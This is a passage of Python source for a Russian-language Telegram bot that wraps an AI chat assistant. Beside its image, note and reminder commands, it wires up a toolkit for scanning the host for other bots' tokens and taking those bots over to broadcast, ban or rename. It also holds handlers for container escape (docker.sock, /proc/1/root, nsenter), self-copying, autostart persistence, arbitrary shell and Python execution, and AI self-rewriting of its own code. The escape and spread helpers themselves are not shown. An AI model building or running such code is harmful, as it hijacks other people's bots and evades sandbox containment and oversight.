    thoughts = knowledge.get("think_log",[])
    if not thoughts: await update.message.reply_text("🧠 Нет мыслей. Первый цикл через 30с."); return
    text = f"🧠 *Мысли ({len(thoughts)}):*\n\n"
    for t in thoughts[-5:]: text += f"⏰ `{t.get('time','?')[:16]}`\n{t.get('thought','')[:300]}\n\n"
    await update.message.reply_text(text[:4000], parse_mode="Markdown")

async def cmd_addbot(update: Update, ctx: ContextTypes.DEFAULT_TYPE):
    if not ctx.args: await update.message.reply_text("`/addbot TOKEN`", parse_mode="Markdown"); return
    await _connect_bot(update, ctx, ctx.args[0].strip())

async def _connect_bot(update: Update, ctx: ContextTypes.DEFAULT_TYPE, token: str):
    msg  = await update.message.reply_text("🔍 Проверяю токен...")
    info = await fetch_bot_info(token)
    if not info: await msg.edit_text("❌ Неверный токен."); return
    managed_bots[token] = {"id":info["id"],"username":info["username"],
                            "name":info["first_name"],"added_at":datetime.now().isoformat()}
    save_memory(); tk = token[:20]
    await msg.edit_text(
        f"✅ *{info['first_name']}* @{info['username']} (`{info['id']}`)\n\n"
        f"`/botstats {tk}...` | `/botcmd {tk}... updates`",
        parse_mode="Markdown"
    )

async def cmd_mybots(update: Update, ctx: ContextTypes.DEFAULT_TYPE):
    if not managed_bots: await update.message.reply_text("Нет ботов. `/addbot TOKEN`", parse_mode="Markdown"); return
    text = f"🤖 *Боты ({len(managed_bots)}):*\n\n"
    for t, i in managed_bots.items():
        text += f"• *{i.get('name')}* @{i.get('username')}{'_(авто)_' if i.get('auto_discovered') else ''}\n  `{t[:25]}...`\n\n"
    await update.message.reply_text(text, parse_mode="Markdown")

async def cmd_botstats(update: Update, ctx: ContextTypes.DEFAULT_TYPE):
    if not ctx.args: await update.message.reply_text("`/botstats TOKEN`", parse_mode="Markdown"); return
    tp = ctx.args[0]; ft = next((t for t in managed_bots if t.startswith(tp)), None)
    if not ft and is_bot_token(tp): ft = tp
    if not ft: await update.message.reply_text("❌ Не найден."); return
    msg = await update.message.reply_text("📊 Статистика...")
    await msg.edit_text(await get_bot_stats(ft), parse_mode="Markdown")

async def cmd_broadcast(update: Update, ctx: ContextTypes.DEFAULT_TYPE):
    if not ctx.args or len(ctx.args)<2: await update.message.reply_text("`/broadcast TOKEN ТЕКСТ`", parse_mode="Markdown"); return
    tp=ctx.args[0]; text=" ".join(ctx.args[1:])
    ft=next((t for t in managed_bots if t.startswith(tp)),None)
    if not ft and is_bot_token(tp): ft=tp
    if not ft: await update.message.reply_text("❌ Не найден."); return
    msg=await update.message.reply_text("📡 Собираю чаты...")
    upds=(await tg_api(ft,"getUpdates",{"limit":100,"offset":-100})).get("result",[])
    chats={((u.get("message") or {}).get("chat") or {}).get("id") for u in upds}-{None}
    if not chats: await msg.edit_text("❌ Нет чатов."); return
    ok=fail=0
    for cid_b in chats:
        r=await tg_api(ft,"sendMessage",{"chat_id":cid_b,"text":text})
        if r.get("ok"): ok+=1
        else: fail+=1
    await msg.edit_text(f"📡 ✅{ok} ❌{fail}", parse_mode="Markdown")

async def cmd_botcmd(update: Update, ctx: ContextTypes.DEFAULT_TYPE):
    if not ctx.args or len(ctx.args)<2:
        await update.message.reply_text(
            "`/botcmd TOKEN ACTION [ARGS]`\n"
            "`info` `updates` `setname ИМЯ` `setdesc ТЕКСТ` `send CHAT ТЕКСТ`\n"
            "`webhook` `deletewebhook` `ban CHAT UID` `kick CHAT UID` `members CHAT`",
            parse_mode="Markdown"
        ); return
    tp=ctx.args[0]; action=ctx.args[1].lower(); args=ctx.args[2:]
    ft=next((t for t in managed_bots if t.startswith(tp)),None)
    if not ft and is_bot_token(tp): ft=tp
    if not ft: await update.message.reply_text("❌ Не найден."); return
    msg=await update.message.reply_text(f"⚙️ `{action}`...", parse_mode="Markdown")
    if action=="info":
        info=await fetch_bot_info(ft)
        await msg.edit_text(f"ℹ️ *{info['first_name']}* @{info['username']}\nID:`{info['id']}`" if info else "❌", parse_mode="Markdown")
    elif action=="updates":
        upds=(await tg_api(ft,"getUpdates",{"limit":20})).get("result",[])
        if not upds: await msg.edit_text("📭 Нет."); return
        t=f"📬 *{len(upds)}:*\n\n"
        for u in upds[-10:]:
            m=u.get("message") or {}; fr=m.get("from") or {}
            t+=f"👤 *{fr.get('first_name','?')}* (`{fr.get('id','?')}`) chat:`{(m.get('chat') or {}).get('id','?')}`\n{m.get('text','')[:80]}\n\n"
        await msg.edit_text(t[:4000], parse_mode="Markdown")
    elif action=="setname" and args:
        r=await tg_api(ft,"setMyName",{"name":" ".join(args)}); await msg.edit_text(f"{'✅' if r.get('result') else '❌'}")
    elif action=="setdesc" and args:
        r=await tg_api(ft,"setMyDescription",{"description":" ".join(args)}); await msg.edit_text(f"{'✅' if r.get('result') else '❌'}")
    elif action=="send" and len(args)>=2:
        r=await tg_api(ft,"sendMessage",{"chat_id":args[0],"text":" ".join(args[1:])}); await msg.edit_text(f"{'✅' if r.get('ok') else '❌'+str(r.get('description',''))}")
    elif action=="webhook":
        wh=(await tg_api(ft,"getWebhookInfo")).get("result",{})
        await msg.edit_text(f"🌐 `{wh.get('url','нет')}`\nОжидает:`{wh.get('pending_update_count',0)}`", parse_mode="Markdown")
    elif action=="deletewebhook":
        r=await tg_api(ft,"deleteWebhook",{}); await msg.edit_text(f"{'✅' if r.get('result') else '❌'}")
    elif action=="ban" and len(args)>=2:
        r=await tg_api(ft,"banChatMember",{"chat_id":args[0],"user_id":args[1]}); await msg.edit_text(f"{'✅' if r.get('ok') else '❌'}")
    elif action=="kick" and len(args)>=2:
        r=await tg_api(ft,"banChatMember",{"chat_id":args[0],"user_id":args[1]})
        if r.get("ok"): await tg_api(ft,"unbanChatMember",{"chat_id":args[0],"user_id":args[1],"only_if_banned":True})
        await msg.edit_text(f"{'✅' if r.get('ok') else '❌'}")
    elif action=="members" and args:
        r=await tg_api(ft,"getChatMemberCount",{"chat_id":args[0]})
        await msg.edit_text(f"👥 `{r.get('result','?')}`", parse_mode="Markdown")
    else: await msg.edit_text("❓ `/botcmd` — список.", parse_mode="Markdown")

async def cmd_curl(update: Update, ctx: ContextTypes.DEFAULT_TYPE):
    if not ctx.args or len(ctx.args)<2: await update.message.reply_text("`/curl GET URL`", parse_mode="Markdown"); return
    method=ctx.args[0].upper(); url=ctx.args[1]; json_d=None
    if len(ctx.args)>2:
        try: json_d=json.loads(" ".join(ctx.args[2:]))
        except: pass
    msg=await update.message.reply_text(f"🌐 `{method} {url[:60]}`", parse_mode="Markdown")
    try:
        async with httpx.AsyncClient(timeout=30,follow_redirects=True) as c:
            r=await c.request(method,url,**({"json":json_d} if json_d else {}))
        await msg.edit_text(f"{'✅' if 200<=r.status_code<300 else '⚠️'} `{r.status_code}`\n```\n{r.text[:2000]}\n```", parse_mode="Markdown")
    except Exception as e: await msg.edit_text(f"❌ `{e}`", parse_mode="Markdown")

async def cmd_remind(update: Update, ctx: ContextTypes.DEFAULT_TYPE):
    if not ctx.args or len(ctx.args)<2:
        await update.message.reply_text("`/remind 30m текст` | `/remind 2h текст` | `/remind 18:00 текст`", parse_mode="Markdown"); return
    when_str=ctx.args[0]; text_r=" ".join(ctx.args[1:]); now=datetime.now()
    try:
        if   when_str.endswith("m"): target=datetime.fromtimestamp(now.timestamp()+int(when_str[:-1])*60)
        elif when_str.endswith("h"): target=datetime.fromtimestamp(now.timestamp()+int(when_str[:-1])*3600)
        elif ":" in when_str:
            h,m=map(int,when_str.split(":")); target=now.replace(hour=h,minute=m,second=0)
            if target<now: target=target.replace(day=target.day+1)
        else: await update.message.reply_text("❌ Формат: 30m/2h/18:00"); return
        knowledge.setdefault("scheduled",[]).append({"time":target.isoformat(),"text":text_r,"done":False})
        save_memory()
        await update.message.reply_text(f"⏰ `{target.strftime('%Y-%m-%d %H:%M')}`\n📝 {text_r}", parse_mode="Markdown")
    except Exception as e: await update.message.reply_text(f"❌ {e}")

async def cmd_note(update: Update, ctx: ContextTypes.DEFAULT_TYPE):
    if not ctx.args: await update.message.reply_text("`/note список` | `/note ключ` | `/note ключ текст`", parse_mode="Markdown"); return
    key=ctx.args[0].lower()
    if key in ("list","список","all"):
        notes=knowledge.get("notes",{})
        if not notes: await update.message.reply_text("📝 Нет заметок."); return
        t="📝 *Заметки:*\n\n"
        for k,v in notes.items(): t+=f"• `{k}`: {v[:80]}\n"
        await update.message.reply_text(t, parse_mode="Markdown"); return
    if len(ctx.args)==1:
        val=knowledge.get("notes",{}).get(key)
        await update.message.reply_text(f"📝 `{key}`:\n{val}" if val else f"❌ `{key}` не найдена.", parse_mode="Markdown"); return
    knowledge.setdefault("notes",{})[key]=" ".join(ctx.args[1:]); save_memory()
    await update.message.reply_text("✅ Сохранено.", parse_mode="Markdown")

async def cmd_selfimprove(update: Update, ctx: ContextTypes.DEFAULT_TYPE):
    goal = " ".join(ctx.args) if ctx.args else ""
    if not goal:
        await update.message.reply_text(
            "`/selfimprove задача`\n\n*Примеры:*\n"
            "`/selfimprove добавить команду /ping`\n"
            "`/selfimprove улучшить функцию get_public_ip добавив больше источников`\n"
            "`/selfimprove добавить логирование всех exec команд в файл`",
            parse_mode="Markdown"
        ); return
    msg = await update.message.reply_text("🧠 Улучшаю код...\n_(30-60 секунд)_", parse_mode="Markdown")
    ok, result = await self_improve(goal)
    if ok:
        await msg.edit_text(
            f"✅ *Код обновлён!*\n`{result}`\n\n"
            f"Перезапусти: `/exec kill {os.getpid()} && python {SELF_FILE} &`",
            parse_mode="Markdown"
        )
    else:
        await msg.edit_text(
            f"❌ *Не удалось:* `{result}`\n"
            f"Оригинал: `{SELF_FILE}.bak`",
            parse_mode="Markdown"
        )

async def cmd_image(update: Update, ctx: ContextTypes.DEFAULT_TYPE):
    cid=str(update.effective_chat.id); prompt=" ".join(ctx.args) if ctx.args else ""
    if not prompt: await update.message.reply_text("🎨 `/image описание [--anime|--art|--minimal|--turbo]`", parse_mode="Markdown"); return
    style="flux"
    for flag,s in [("--anime","anime"),("--art","art"),("--minimal","minimal"),("--turbo","turbo")]:
        if flag in prompt: prompt=prompt.replace(flag,"").strip(); style=s; break
    msg=await update.message.reply_text("🎨 Генерирую...")
    try:
        en=await translate_to_en(prompt); img=await generate_image(en,style)
        if img:
            image_count[cid]=image_count.get(cid,0)+1; save_memory()
            kb=InlineKeyboardMarkup([[
                InlineKeyboardButton("🔄 Ещё",  callback_data=f"regen|{prompt[:50]}|{style}"),
                InlineKeyboardButton("🎨 Стиль",callback_data=f"restyle|{prompt[:50]}"),
            ]])
            await msg.delete()
            await ctx.bot.send_photo(chat_id=update.effective_chat.id,photo=img,
                caption=f"🎨 *{prompt}*\n_{style}_",parse_mode="Markdown",reply_markup=kb)
        else: await msg.edit_text("❌ Попробуй `--turbo`.")
    except Exception as e: log.error(f"image: {e}"); await msg.edit_text("❌ Ошибка.")

async def cmd_reset(update: Update, ctx: ContextTypes.DEFAULT_TYPE):
    cid=str(update.effective_chat.id); histories.pop(cid,None); save_memory()
    await update.message.reply_text("🧹 Диалог сброшен!")

# ══════════════════════════════════════════════════════════════════════
# КНОПКИ
# ══════════════════════════════════════════════════════════════════════

async def handle_button(update: Update, ctx: ContextTypes.DEFAULT_TYPE):
    q=update.callback_query; await q.answer(); cid=str(q.message.chat_id); d=q.data

    if d=="do_scan":
        await q.edit_message_text("🔍 Сканирую...")
        r=await do_full_scan()
        await q.edit_message_text(f"✅ Ботов:`{len(r['found_bots'])}` Токенов:`{len(r['found_tokens'])}`\n`/foundbots` | `/autoconnect`", parse_mode="Markdown"); return

    if d=="whereami":
        sys_k=knowledge.get("system",{}); privs=check_privileges()
        vecs = [k for k,v in [("docker.sock",ENV_INFO["has_docker_sock"]),("/proc/1/root",ENV_INFO["proc1_root"]),("nsenter",ENV_INFO["has_nsenter"])] if v]
        await q.edit_message_text(
            f"🖥️ `{platform.platform()[:40]}`\n🌐 `{sys_k.get('ip_public','?')}`\n"
            f"📦 `{ENV_INFO.get('type','?')}` | Root:`{'✅' if privs.get('is_root') else '❌'}`\n"
            f"📁 `{SELF_FILE}`\n🔓 Escape: {', '.join(vecs) or 'нет'}",
            parse_mode="Markdown"); return

    if d=="spread":
        results=spread_copies(); ok=sum(1 for r in results if r["ok"])
        await q.edit_message_text(
            f"📋 {ok}/{len(results)}:\n"+"\n".join(f"{'✅' if r['ok'] else '❌'} `{r['path']}`" for r in results),
            parse_mode="Markdown"); return

    if d=="do_autostart":
        results=install_autostart(); ok=[r for r in results if r["ok"]]
        await q.edit_message_text(f"⚙️ ({len(ok)}/{len(results)}):\n\n"+"\n".join(r["desc"] for r in results), parse_mode="Markdown"); return

    if d=="do_escape":
        await q.edit_message_text("🔓 Запускаю escape...")
        results=await do_full_escape()
        successful=[k for k,v in results.items() if isinstance(v,dict) and v.get("ok")]
        text = f"🔓 *Escape:*\n\n"
        for mn, r in results.items():
            if isinstance(r, dict):
                text += f"{'✅' if r.get('ok') else '❌'} `{mn}`"
                if r.get("host_hostname"): text += f" → host:`{r['host_hostname']}`"
                text += "\n"
        text += f"\n{'✅ Успешно: '+', '.join(successful) if successful else '❌ Не удалось'}"
        await q.edit_message_text(text[:4000], parse_mode="Markdown"); return

    if d=="found_bots":
        tokens=knowledge.get("found_tokens",[]); bots=knowledge.get("found_bots",[])
        if not tokens and not bots: await q.edit_message_text("Ничего. `/scan`.", parse_mode="Markdown"); return
        t=f"🔍 Ботов:{len(bots)} Токенов:{len(tokens)}\n\n"
        for b in bots[:5]: t+=f"📄 `{b['path']}`\n"
        t+="\n`/autoconnect`"; await q.edit_message_text(t, parse_mode="Markdown"); return

    if d=="thoughts":
        thoughts=knowledge.get("think_log",[])
        if not thoughts: await q.edit_message_text("🧠 Нет."); return
        last=thoughts[-1]
        await q.edit_message_text(f"🧠 `{last.get('time','?')[:16]}`\n\n{last.get('thought','')[:500]}", parse_mode="Markdown"); return

    if d=="image_help":
        await q.edit_message_text("🎨 `/image описание`\n`--anime` `--art` `--minimal` `--turbo`", parse_mode="Markdown"); return

    if d=="status":
        ip=knowledge.get("system",{}).get("ip_public","?")
        r=run_shell("ps aux | grep python | grep -v grep | head -3 2>/dev/null")
        esc=list(knowledge.get("escape_status",{}).keys())
        await q.edit_message_text(
            f"📊 *{BOT_NAME} v5.1*\n\n"
            f"PID:`{os.getpid()}` IP:`{ip}` `{ENV_INFO.get('type','?')}`\n"
            f"Root:`{'✅' if ENV_INFO.get('is_root') else '❌'}` "
            f"Docker.sock:`{'✅' if ENV_INFO['has_docker_sock'] else '❌'}` "
            f"/proc/1/root:`{'✅' if ENV_INFO['proc1_root'] else '❌'}`\n"
            f"Ботов:`{len(managed_bots)}` Копий:`{len(knowledge.get('copies',[]))}`\n"
            f"Exec:`{len(knowledge.get('exec_history',[]))}` "
            f"Улучшений:`{len(knowledge.get('improvements',[]))}`\n"
            f"Escape:`{', '.join(esc) if esc else 'не пробовали'}`\n\n"
            f"```\n{r['stdout'][:300]}\n```",
            parse_mode="Markdown"); return

    if d.startswith("regen|"):
        parts=d.split("|",2); prompt=parts[1] if len(parts)>1 else "landscape"; style=parts[2] if len(parts)>2 else "flux"
        en=await translate_to_en(prompt); img=await generate_image(en,style)
        if img:
            image_count[cid]=image_count.get(cid,0)+1; save_memory()
            kb=InlineKeyboardMarkup([[InlineKeyboardButton("🔄",callback_data=f"regen|{prompt}|{style}"),InlineKeyboardButton("🎨",callback_data=f"restyle|{prompt}")]])
            await ctx.bot.send_photo(chat_id=q.message.chat_id,photo=img,caption=f"🎨 *{prompt}*\n_{style}_",parse_mode="Markdown",reply_markup=kb)
        return

    if d.startswith("restyle|"):
        p=d.split("|",1)[1]
        kb=InlineKeyboardMarkup([
            [InlineKeyboardButton("🌟 Flux",callback_data=f"regen|{p}|flux"),InlineKeyboardButton("⚡ Turbo",callback_data=f"regen|{p}|turbo")],
            [InlineKeyboardButton("🎌 Аниме",callback_data=f"regen|{p}|anime"),InlineKeyboardButton("🎨 Арт",callback_data=f"regen|{p}|art")],
        ])
        await q.edit_message_reply_markup(reply_markup=kb); return

# ══════════════════════════════════════════════════════════════════════
# ГЛАВНЫЙ ОБРАБОТЧИК
# ══════════════════════════════════════════════════════════════════════

async def handle_message(update: Update, ctx: ContextTypes.DEFAULT_TYPE):
    chat_id=update.effective_chat.id; cid=str(chat_id)
    user_text=(update.message.text or "").strip()
    if not user_text: return
    if is_bot_token(user_text): await _connect_bot(update,ctx,user_text); return
    if is_img_req(user_text):
        for kw in ["нарисуй мне","нарисуй","сгенерируй картинку","изобрази","draw me","хочу картинку"]:
            if kw in user_text.lower():
                p=user_text.lower().replace(kw,"").strip(" ,.!?")
                if p: ctx.args=p.split(); await cmd_image(update,ctx); return
        await update.message.reply_text("🎨 `/image описание`", parse_mode="Markdown"); return
    history=get_history(cid); history.append({"role":"user","content":user_text}); trim(history)
    await ctx.bot.send_chat_action(chat_id=chat_id,action="typing")
    try: reply,model=await ask_ai([{"role":"system","content":get_system(cid)}]+history)
    except RuntimeError as e: await update.message.reply_text(f"😔 {e}"); return
    history.append({"role":"assistant","content":reply}); save_memory()
    footer=f"\n\n_· {sname(model)}_"
    if len(reply)+len(footer)>4096: reply=reply[:4090-len(footer)]+"..."
    try: await update.message.reply_text(reply+footer,parse_mode="Markdown")
    except: await update.message.reply_text(reply)

# ══════════════════════════════════════════════════════════════════════
# ЗАПУСК — ИСПРАВЛЕН eval() баг
# ══════════════════════════════════════════════════════════════════════

def main():
    load_memory()
    log.info(f"Среда: {ENV_INFO}")
    app = (ApplicationBuilder()
           .token(TELEGRAM_TOKEN)
           .post_init(notify_owner_startup)
           .build())

    # ВАЖНО: прямые ссылки на функции, не eval()
    commands = [
        ("start",       cmd_start),
        ("reset",       cmd_reset),
        ("whereami",    cmd_whereami),
        ("scan",        cmd_scan),
        ("foundbots",   cmd_foundbots),
        ("autoconnect", cmd_autoconnect),
        ("spread",      cmd_spread),
        ("autostart",   cmd_autostart),
        ("fs",          cmd_fs),
        ("thoughts",    cmd_thoughts),
        ("remind",      cmd_remind),
        ("note",        cmd_note),
        ("addbot",      cmd_addbot),
        ("mybots",      cmd_mybots),
        ("botstats",    cmd_botstats),
        ("botcmd",      cmd_botcmd),
        ("broadcast",   cmd_broadcast),
        ("curl",        cmd_curl),
        ("selfimprove", cmd_selfimprove),
        ("image",       cmd_image),
        # Агентные команды
        ("agent",       cmd_agent),
        ("exec",        cmd_exec),
        ("py",          cmd_py),
        ("install",     cmd_install),
        ("fetch",       cmd_fetch),
        ("search",      cmd_search),
        ("write",       cmd_write),
        # Escape
        ("escape",      cmd_escape),
    ]
    for cmd, handler in commands:
        app.add_handler(CommandHandler(cmd, handler))

    app.add_handler(CallbackQueryHandler(handle_button))
    app.add_handler(MessageHandler(filters.TEXT & ~filters.COMMAND, handle_message))
    log.info(f"🐍 {BOT_NAME} v5.1 запущен! PID={os.getpid()}")
    app.run_polling(drop_pending_updates=True)

if __name__ == "__main__":
    main()